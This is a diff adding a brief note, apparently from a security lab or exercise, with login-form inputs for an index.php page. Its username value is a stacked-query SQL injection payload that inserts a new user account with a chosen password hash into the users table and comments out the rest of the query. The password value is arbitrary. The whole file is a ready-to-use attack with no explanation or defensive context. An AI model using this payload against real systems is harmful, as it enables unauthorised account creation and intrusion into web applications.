@@ -1,0 +1,4 @@
+Use the following on the index.php
+
+username: joes'; insert into users (username, pass, fname, lname) values ('west1', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8', 'Craig', 'West'); #
+password: anything at all
